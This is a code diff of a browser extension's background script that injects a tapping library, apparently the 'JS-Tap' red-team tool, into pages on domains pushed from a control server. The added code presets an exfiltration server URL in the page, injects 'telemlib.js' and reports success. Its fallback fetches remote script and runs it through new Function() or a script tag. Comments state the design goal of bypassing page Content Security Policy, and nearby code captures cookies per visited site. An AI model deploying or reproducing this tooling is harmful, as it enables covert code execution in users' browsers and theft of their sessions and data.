@@ -185,7 +185,7 @@ export default defineBackground(() => {
             if (rawData.trim().startsWith('{')) {
                 const config = JSON.parse(rawData);
                 if (config.type === 'CONFIG_INJECTION') {
-                    console.log("BEX: Updating injection rule for domain:", config.domain, "Active:", config.active, "URL:", config.url);
+                    console.log("BEX: Updating injection rule for domain:", config.domain, "Active:", config.active);
 
                     // Whitelist enforcement: reject injection tasks for non-whitelisted domains
                     if (config.active && !isDomainWhitelisted(config.domain)) {
@@ -197,12 +197,12 @@ export default defineBackground(() => {
                     const currentRules = rules.injectionRules || {};
 
                     if (config.active) {
-                        let finalUrl = config.url;
-                        if (finalUrl.startsWith('/')) {
-                            // Resolve relative URL against the beacon's known server URL
-                            finalUrl = `${CONFIG.serverUrl}${finalUrl}`;
-                        }
-                        currentRules[config.domain] = finalUrl;
+                        currentRules[config.domain] = {
+                            serverUrl: config.serverUrl,
+                            tag: config.tag,
+                            parentUUID: config.parentUUID,
+                            mode: config.mode
+                        };
                     } else {
                         console.log("BEX: Removing injection rule for", config.domain);
                         delete currentRules[config.domain];
@@ -219,8 +219,7 @@ export default defineBackground(() => {
                                 const tabUrl = new URL(tab.url);
                                 if (tabUrl.hostname === config.domain) {
                                     console.log("BEX: Found existing tab for new rule, injecting immediately:", tab.id);
-                                    // Use the resolved finalUrl from currentRules
-                                    injectIntoTab(tab.id, currentRules[config.domain]);
+                                    injectIntoTab(tab.id, currentRules[config.domain], config.domain);
                                 }
                             }
                         }
@@ -295,58 +294,104 @@ export default defineBackground(() => {
     }
   }
 
-  async function injectIntoTab(tabId: number, scriptUrl: string) {
-    // Helper to perform the actual script injection.
-    // Fetches the script in the service worker context (bypasses page CSP),
-    // then injects the code directly via executeScript (also bypasses CSP).
-    // Falls back to <script src> if fetch fails (works when no CSP blocks it).
+  interface InjectionConfig {
+    serverUrl: string;
+    tag: string;
+    parentUUID: string;
+    mode: string;
+  }
+
+  async function injectIntoTab(tabId: number, config: InjectionConfig, domain: string) {
+    // Strategy: try the bundled file injection first (bypasses ALL CSP including
+    // meta tags). If that fails for any reason, fall back to the old approach
+    // (fetch script from server, then new Function() or <script src> tag).
+
+    // --- PRIMARY: Bundled injection (handles meta-tag CSP) ---
     try {
-        let scriptCode: string | null = null;
+        // Phase 1: Pre-set config variables in the page's MAIN world
+        await browser.scripting.executeScript({
+            target: { tabId },
+            world: 'MAIN',
+            func: (cfg: { mode: string; serverUrl: string; tag: string; parentUUID: string }) => {
+                (window as any).taperMode = cfg.mode;
+                (window as any).taperexfilServer = cfg.serverUrl;
+                (window as any).taperTag = cfg.tag;
+                (window as any).taperParentUUID = cfg.parentUUID;
+            },
+            args: [config]
+        });
+
+        // Phase 2: Inject bundled telemlib.js — bypasses page CSP
+        await browser.scripting.executeScript({
+            target: { tabId },
+            world: 'MAIN',
+            files: ['telemlib.js']
+        });
+
+        // Verify the injection actually ran — some install modes (e.g. Edge
+        // force-install via policy) silently swallow executeScript file injections.
+        // Check for a marker that telemlib.js sets when it initializes.
+        const verifyResult = await browser.scripting.executeScript({
+            target: { tabId },
+            world: 'MAIN',
+            func: () => !!(window as any).taperexfilServer
+        });
+
+        if (verifyResult?.[0]?.result) {
+            console.log("BEX: Bundled injection verified for tab", tabId);
+            sendEncrypted("/bex/injection_success", { domain });
+            return; // Success — no fallback needed
+        }
+        console.warn("BEX: Bundled injection completed but telemlib did not initialize — falling back");
+    } catch (e) {
+        console.warn("BEX: Bundled injection failed for tab", tabId, "— falling back to URL-based:", e);
+    }
+
+    // --- FALLBACK: URL-based injection (works on non-meta-CSP sites) ---
+    // The /lib/injected/ endpoint updates last_success server-side when fetched,
+    // so no separate success report is needed for fallback paths.
+    const scriptUrl = `${config.serverUrl}/lib/injected/${config.parentUUID}/${domain}`;
+
+    try {
+        let injectionFunc: Function | null = null;
         try {
+            console.log("BEX: Fetching script for direct injection:", scriptUrl);
             const response = await fetch(scriptUrl);
             if (response.ok) {
-                scriptCode = await response.text();
+                const scriptCode = await response.text();
+                console.log("BEX: Fetched script, length:", scriptCode.length, "chars. Creating injection function...");
+                injectionFunc = new Function(scriptCode);
             }
         } catch (fetchErr) {
-            console.warn("BEX: Could not fetch script for direct injection, falling back to <script src>:", fetchErr);
+            console.warn("BEX: Fetch+Function failed:", fetchErr);
         }
 
-        if (scriptCode) {
-            // Direct code injection — bypasses page CSP (including meta tag CSP)
+        if (injectionFunc) {
             await browser.scripting.executeScript({
-                target: { tabId: tabId },
+                target: { tabId },
                 world: 'MAIN',
-                func: (code: string, src: string) => {
-                    console.log("%c[BEX] MAIN world executing direct injection for: " + src, "color: #00ff00; font-weight: bold;");
-                    try {
-                        (0, eval)(code);
-                        console.log("%c[BEX] JS-Tap script executed successfully.", "color: #00ff00;");
-                    } catch (e) {
-                        console.error("[BEX] JS-Tap script execution failed.", e);
-                    }
-                },
-                args: [scriptCode, scriptUrl]
+                func: injectionFunc as () => void,
             });
+            console.log("BEX: Fetch+func injection succeeded for tab", tabId);
         } else {
-            // Fallback: create <script src> tag (works when CSP allows the URL)
+            // Last resort: <script src> tag (works when page has no CSP)
             await browser.scripting.executeScript({
-                target: { tabId: tabId },
+                target: { tabId },
                 world: 'MAIN',
                 func: (src: string) => {
-                    console.log("%c[BEX] MAIN world executing loader creation for: " + src, "color: #00ff00; font-weight: bold;");
                     const script = document.createElement('script');
                     script.src = src;
                     script.async = true;
                     script.onload = () => console.log("%c[BEX] JS-Tap script loaded successfully.", "color: #00ff00;");
-                    script.onerror = (e) => console.error("[BEX] JS-Tap script failed to load. Target URL likely blocked or 404.", e);
+                    script.onerror = (e: any) => console.error("[BEX] JS-Tap script failed to load.", e);
                     (document.head || document.documentElement).appendChild(script);
                 },
                 args: [scriptUrl]
             });
+            console.log("BEX: Script tag injection dispatched to tab", tabId);
         }
-        console.log("BEX: Injection successfully dispatched to tab", tabId);
     } catch (e) {
-        console.error("BEX: [ERROR] Injection failed for tab", tabId, e);
+        console.error("BEX: [ERROR] All injection methods failed for tab", tabId, e);
     }
   }
 
@@ -393,9 +438,13 @@ export default defineBackground(() => {
         captureCookiesForUrl(details.url, url.hostname);
 
         if (currentRules[url.hostname]) {
-            const scriptUrl = currentRules[url.hostname];
-            console.log("BEX: [MATCH] Target domain matched! Injecting loader:", scriptUrl, "into tab", details.tabId);
-            injectIntoTab(details.tabId, scriptUrl);
+            const rule = currentRules[url.hostname];
+            if (typeof rule === 'object' && rule.serverUrl) {
+                console.log("BEX: [MATCH] Target domain matched! Injecting telemlib into tab", details.tabId);
+                injectIntoTab(details.tabId, rule, url.hostname);
+            } else {
+                console.log("BEX: Stale rule for", url.hostname, "(old format) — re-enable injection from the portal");
+            }
         } else {
             console.log("BEX: No rule for", url.hostname, "Available rules:", Object.keys(currentRules));
         }
